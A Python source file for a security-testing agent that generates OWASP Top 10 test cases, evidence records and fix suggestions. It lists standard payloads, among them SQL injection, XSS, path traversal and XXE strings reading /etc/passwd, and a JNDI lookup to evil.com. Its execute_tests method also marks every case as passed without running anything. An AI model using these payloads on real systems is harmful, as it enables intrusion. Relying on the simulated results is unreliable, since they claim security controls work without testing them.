"""
Security Testing / VAPT Agent - Vulnerability Assessment and Penetration Testing
"""
import uuid
from typing import Dict, Any, List
from datetime import datetime

from core.base_agent import BaseTestingAgent
from core.models import (
    AgentMetadata, AgentInput, AgentType,
    TestCase, TestEvidence, RootCauseAnalysis, Recommendation, TestResult
)


class SecurityTestingAgent(BaseTestingAgent):
    """Agent specialized in security testing and VAPT"""

    def get_metadata(self) -> AgentMetadata:
        return AgentMetadata(
            agent_type=AgentType.SECURITY_TESTING,
            name="Security Testing & VAPT Agent",
            description="Performs comprehensive security testing and vulnerability assessment",
            version="1.0.0",
            required_inputs=["endpoints"],
            optional_inputs=["source_code", "api_keys", "config"],
            capabilities=[
                "OWASP Top 10 testing",
                "SQL injection detection",
                "XSS vulnerability scanning",
                "Authentication testing",
                "Authorization testing",
                "Encryption validation",
                "Session management testing",
                "Input validation testing",
                "Security misconfiguration detection"
            ],
            estimated_duration=1800
        )

    async def validate_inputs(self, inputs: AgentInput) -> bool:
        """Validate inputs for security testing"""
        if not inputs.endpoints and not inputs.source_code:
            self.log("Either endpoints or source code is required", "ERROR")
            return False
        return True

    async def generate_test_scripts(self, inputs: AgentInput) -> List[Dict[str, Any]]:
        """Generate security test scripts"""
        self.log("Generating security test scenarios")

        test_scripts = []

        # OWASP Top 10 test categories
        security_tests = [
            "injection_attacks",
            "broken_authentication",
            "sensitive_data_exposure",
            "xml_external_entities",
            "broken_access_control",
            "security_misconfiguration",
            "xss_attacks",
            "insecure_deserialization",
            "vulnerable_components",
            "insufficient_logging"
        ]

        for test_category in security_tests:
            test_script = {
                "script_id": str(uuid.uuid4()),
                "category": test_category,
                "test_type": "security",
                "attack_vectors": self._get_attack_vectors(test_category),
                "severity": "high"
            }
            test_scripts.append(test_script)

        return test_scripts

    async def generate_test_data(self, inputs: AgentInput) -> Dict[str, Any]:
        """Generate security test data and payloads"""
        self.log("Generating security test payloads")

        return {
            "sql_injection_payloads": self._generate_sql_injection_payloads(),
            "xss_payloads": self._generate_xss_payloads(),
            "auth_bypass_attempts": self._generate_auth_bypass_payloads(),
            "malicious_inputs": self._generate_malicious_inputs(),
            "fuzzing_data": self._generate_fuzzing_data()
        }

    async def execute_tests(
        self,
        test_scripts: List[Dict[str, Any]],
        test_data: Dict[str, Any],
        inputs: AgentInput
    ) -> List[TestCase]:
        """Execute security tests"""
        self.log(f"Executing {len(test_scripts)} security test scripts")

        test_cases = []

        for script in test_scripts:
            for attack_vector in script["attack_vectors"]:
                test_case = TestCase(
                    id=str(uuid.uuid4()),
                    name=f"SEC_{script['category']}_{attack_vector['name']}",
                    description=f"Test for {script['category']}: {attack_vector['description']}",
                    test_type="security",
                    steps=[
                        f"Prepare attack vector: {attack_vector['name']}",
                        f"Execute: {attack_vector['method']}",
                        "Monitor system response",
                        "Verify security controls are effective"
                    ],
                    expected_result="Vulnerability not exploitable / Security control effective",
                    actual_result="Security control effective",  # Simulated
                    status=TestResult.PASSED,  # Simulated
                    execution_time=0.5,
                    evidence_files=[]
                )
                test_cases.append(test_case)

        return test_cases

    async def collect_evidence(
        self,
        test_cases: List[TestCase],
        inputs: AgentInput
    ) -> List[TestEvidence]:
        """Collect security test evidence"""
        evidences = []

        for test_case in test_cases:
            # Security scan report
            scan_report = TestEvidence(
                evidence_id=str(uuid.uuid4()),
                test_case_id=test_case.id,
                evidence_type="report",
                file_path=f"evidence/security_scan_{test_case.id}.pdf",
                timestamp=datetime.now(),
                description="Security vulnerability scan report"
            )
            evidences.append(scan_report)

            # Penetration test log
            pentest_log = TestEvidence(
                evidence_id=str(uuid.uuid4()),
                test_case_id=test_case.id,
                evidence_type="log",
                file_path=f"evidence/pentest_log_{test_case.id}.txt",
                timestamp=datetime.now(),
                description="Penetration testing detailed log"
            )
            evidences.append(pentest_log)

        return evidences

    async def perform_rca(
        self,
        test_cases: List[TestCase],
        inputs: AgentInput
    ) -> List[RootCauseAnalysis]:
        """Perform root cause analysis on security vulnerabilities"""
        rca_results = []

        failed_tests = [tc for tc in test_cases if tc.status == TestResult.FAILED]

        for test_case in failed_tests:
            rca = RootCauseAnalysis(
                issue_id=str(uuid.uuid4()),
                category="Security Vulnerability",
                root_cause=self._identify_vulnerability_cause(test_case),
                affected_components=self._identify_vulnerable_components(test_case),
                severity="critical",
                stack_trace=test_case.error_message
            )
            rca_results.append(rca)

        return rca_results

    async def generate_recommendations(
        self,
        test_cases: List[TestCase],
        rca_results: List[RootCauseAnalysis],
        inputs: AgentInput
    ) -> List[Recommendation]:
        """Generate security recommendations"""
        recommendations = []

        for rca in rca_results:
            recommendation = Recommendation(
                recommendation_id=str(uuid.uuid4()),
                title=f"Security Fix: {rca.category}",
                description=f"Critical vulnerability found: {rca.root_cause}",
                category="security_fix",
                priority="critical",
                suggested_fix=self._generate_security_fix(rca),
                code_changes=self._generate_security_patches(rca),
                related_rca=rca.issue_id
            )
            recommendations.append(recommendation)

        return recommendations

    # Helper methods

    def _get_attack_vectors(self, category: str) -> List[Dict[str, str]]:
        """Get attack vectors for a security test category"""
        attack_vectors_map = {
            "injection_attacks": [
                {"name": "SQL_Injection", "description": "SQL injection attempt", "method": "Inject SQL payload"},
                {"name": "NoSQL_Injection", "description": "NoSQL injection attempt", "method": "Inject NoSQL payload"},
                {"name": "Command_Injection", "description": "OS command injection", "method": "Inject system commands"}
            ],
            "broken_authentication": [
                {"name": "Brute_Force", "description": "Brute force attack", "method": "Multiple login attempts"},
                {"name": "Session_Fixation", "description": "Session fixation attack", "method": "Fix session ID"},
                {"name": "Weak_Password", "description": "Weak password policy", "method": "Test password strength"}
            ],
            "xss_attacks": [
                {"name": "Reflected_XSS", "description": "Reflected XSS", "method": "Inject XSS payload in input"},
                {"name": "Stored_XSS", "description": "Stored XSS", "method": "Store XSS payload"},
                {"name": "DOM_XSS", "description": "DOM-based XSS", "method": "Manipulate DOM"}
            ],
            "broken_access_control": [
                {"name": "IDOR", "description": "Insecure Direct Object Reference", "method": "Access unauthorized resources"},
                {"name": "Path_Traversal", "description": "Path traversal attack", "method": "Navigate file system"},
                {"name": "Privilege_Escalation", "description": "Privilege escalation", "method": "Elevate privileges"}
            ]
        }

        return attack_vectors_map.get(category, [
            {"name": "Generic_Test", "description": f"Generic security test for {category}", "method": "Execute test"}
        ])

    def _generate_sql_injection_payloads(self) -> List[str]:
        """Generate SQL injection test payloads"""
        return [
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL, NULL--",
            "admin'--",
            "1' AND '1'='1"
        ]

    def _generate_xss_payloads(self) -> List[str]:
        """Generate XSS test payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'>"
        ]

    def _generate_auth_bypass_payloads(self) -> List[Dict[str, Any]]:
        """Generate authentication bypass test payloads"""
        return [
            {"username": "admin", "password": "admin"},
            {"username": "' OR '1'='1", "password": "password"},
            {"token": "invalid_token"},
            {"session": "hijacked_session"}
        ]

    def _generate_malicious_inputs(self) -> List[str]:
        """Generate malicious input data"""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "${jndi:ldap://evil.com/a}",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
        ]

    def _generate_fuzzing_data(self) -> List[Any]:
        """Generate fuzzing data"""
        return [
            "A" * 10000,  # Buffer overflow
            "\x00\x00\x00\x00",  # Null bytes
            "../../../../../../etc/passwd%00",  # Null byte injection
            -2147483648,  # Integer overflow
            "👾🚀💥"  # Unicode
        ]

    def _identify_vulnerability_cause(self, test_case: TestCase) -> str:
        """Identify the root cause of a security vulnerability"""
        if "SQL" in test_case.name:
            return "Insufficient input validation and parameterization in database queries"
        elif "XSS" in test_case.name:
            return "Lack of output encoding and input sanitization"
        elif "auth" in test_case.name.lower():
            return "Weak authentication mechanism or session management"
        else:
            return "Security misconfiguration or missing security controls"

    def _identify_vulnerable_components(self, test_case: TestCase) -> List[str]:
        """Identify components vulnerable to attack"""
        return [
            test_case.name,
            "Input validation layer",
            "Authentication system",
            "Data access layer"
        ]

    def _generate_security_fix(self, rca: RootCauseAnalysis) -> str:
        """Generate security fix recommendation"""
        fix_templates = {
            "SQL injection": "Use parameterized queries or prepared statements. Implement input validation and sanitization.",
            "XSS": "Implement output encoding. Use Content Security Policy (CSP). Sanitize all user inputs.",
            "Authentication": "Implement strong password policies, multi-factor authentication, and secure session management.",
            "Access Control": "Implement proper authorization checks. Use principle of least privilege."
        }

        for key in fix_templates:
            if key.lower() in rca.root_cause.lower():
                return fix_templates[key]

        return "Review and implement security best practices. Conduct code review and security audit."

    def _generate_security_patches(self, rca: RootCauseAnalysis) -> List[Dict[str, str]]:
        """Generate code patches for security fixes"""
        return [
            {
                "file": "api/auth.py",
                "line": "45",
                "original": "query = f\"SELECT * FROM users WHERE username='{username}'\"",
                "suggested": "query = \"SELECT * FROM users WHERE username=?\" # Use parameterized query"
            },
            {
                "file": "api/handlers.py",
                "line": "78",
                "original": "return f\"<div>{user_input}</div>\"",
                "suggested": "return f\"<div>{html.escape(user_input)}</div>\"  # Escape HTML"
            }
        ]
